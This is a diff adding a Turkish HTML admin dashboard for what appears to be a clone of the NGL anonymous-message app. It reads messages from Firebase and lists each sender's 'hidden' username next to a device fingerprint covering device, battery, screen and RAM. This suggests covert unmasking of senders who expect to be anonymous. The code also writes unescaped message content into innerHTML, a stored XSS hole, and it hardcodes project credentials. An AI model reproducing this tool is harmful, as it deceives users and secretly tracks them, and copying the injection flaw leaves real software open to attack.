@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NGL - Admin Kontrol Paneli</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #0f172a; color: white; font-family: sans-serif; }
+        .glass-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; }
+    </style>
+</head>
+<body class="p-4 md:p-10">
+
+    <div class="max-w-6xl mx-auto">
+        <div class="flex justify-between items-center mb-8">
+            <h1 class="text-3xl font-bold text-purple-400">Gelen Gizli Mesajlar</h1>
+            <span id="msgCount" class="bg-purple-600 px-4 py-1 rounded-full text-sm">0 Mesaj</span>
+        </div>
+
+        <div class="overflow-x-auto">
+            <table class="w-full text-left glass-card">
+                <thead class="border-b border-white/10 bg-white/5">
+                    <tr>
+                        <th class="p-4">Tarih</th>
+                        <th class="p-4">Kullanıcı Adı (Gizli)</th>
+                        <th class="p-4">Mesaj</th>
+                        <th class="p-4">Cihaz / Batarya / Ekran</th>
+                    </tr>
+                </thead>
+                <tbody id="messageTableBody">
+                    </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDOeW45v-_JMJKcIpOsF3czNI1yo2dImdU",
+            authDomain: "nglfiree.firebaseapp.com",
+            projectId: "nglfiree",
+            storageBucket: "nglfiree.firebasestorage.app",
+            messagingSenderId: "817950983765",
+            appId: "1:817950983765:web:0c6054651b6383bf9df6dc",
+            databaseURL: "https://nglfiree-default-rtdb.firebaseio.com"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        const dbRef = ref(database, 'gelenMesajlar');
+
+        onValue(dbRef, (snapshot) => {
+            const data = snapshot.val();
+            const tableBody = document.getElementById('messageTableBody');
+            const countSpan = document.getElementById('msgCount');
+            tableBody.innerHTML = "";
+            
+            if (data) {
+                const messages = Object.values(data).reverse(); // En yeni mesaj en üstte
+                countSpan.innerText = `${messages.length} Mesaj`;
+
+                messages.forEach(item => {
+                    const row = `
+                        <tr class="border-b border-white/5 hover:bg-white/5 transition-all">
+                            <td class="p-4 text-xs text-gray-400">${item.tarih}</td>
+                            <td class="p-4 font-bold text-pink-400">${item.kullaniciAdi}</td>
+                            <td class="p-4 text-gray-200">${item.mesaj}</td>
+                            <td class="p-4 text-[11px] text-gray-400">
+                                <b>Cihaz:</b> ${item.detayliParmakIzi.cihaz}<br>
+                                <b>Batarya:</b> ${item.detayliParmakIzi.batarya}<br>
+                                <b>Ekran:</b> ${item.detayliParmakIzi.ekran} | <b>RAM:</b> ${item.detayliParmakIzi.bellek}
+                            </td>
+                        </tr>
+                    `;
+                    tableBody.innerHTML += row;
+                });
+            } else {
+                tableBody.innerHTML = "<tr><td colspan='4' class='p-10 text-center text-gray-500'>Henüz mesaj gelmedi...</td></tr>";
+            }
+        });
+    </script>
+</body>
+</html>
